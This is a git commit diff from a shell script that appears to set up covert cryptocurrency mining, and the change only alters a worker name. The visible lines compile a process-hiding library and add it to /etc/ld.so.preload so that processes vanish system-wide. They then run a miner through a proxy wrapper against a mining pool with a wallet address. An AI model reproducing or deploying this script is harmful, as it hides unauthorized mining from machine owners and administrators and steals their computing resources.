1a1646eb1dc047b19d4201389ecf00395c94f5ee
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-22 01:23:57 +0200

    Update and rename start_avx512_AwAw8_ws2.sh to start_avx512_AzAz8_ws2.sh

--- start_avx512_AzAz8_ws2.sh
+++ start_avx512_AzAz8_ws2.sh
@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./avx512 -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAwAw8 -p IhatePopUps --no-tune
+./graftcp/graftcp ./avx512 -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz8 -p IhatePopUps --no-tune
